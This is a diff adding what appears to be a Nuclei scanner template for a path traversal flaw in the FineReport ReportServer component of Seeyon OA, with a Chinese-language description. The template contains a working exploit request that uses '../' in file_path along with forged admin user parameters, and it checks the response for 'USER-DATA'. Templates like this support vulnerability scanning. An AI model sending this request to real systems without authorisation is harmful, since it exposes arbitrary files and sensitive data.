@@ -1,0 +1,24 @@
+id: seeyon-oa-finereport-traversal
+
+info:
+  name: 致远OA帆软组件ReportServer路径遍历漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    在2022年攻防演练中，发现致远OA系统集成的帆软ReportServer组件存在路径遍历缺陷。
+      该漏洞允许远程攻击者通过构造恶意请求读取任意文件内容，可能导致敏感数据泄露。
+  tags: 致远
+
+http:
+- raw:
+  - |
+    POST /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../seeyon&currentUserName=admin&currentUserId=1&isWebReport=true HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'USER-DATA'
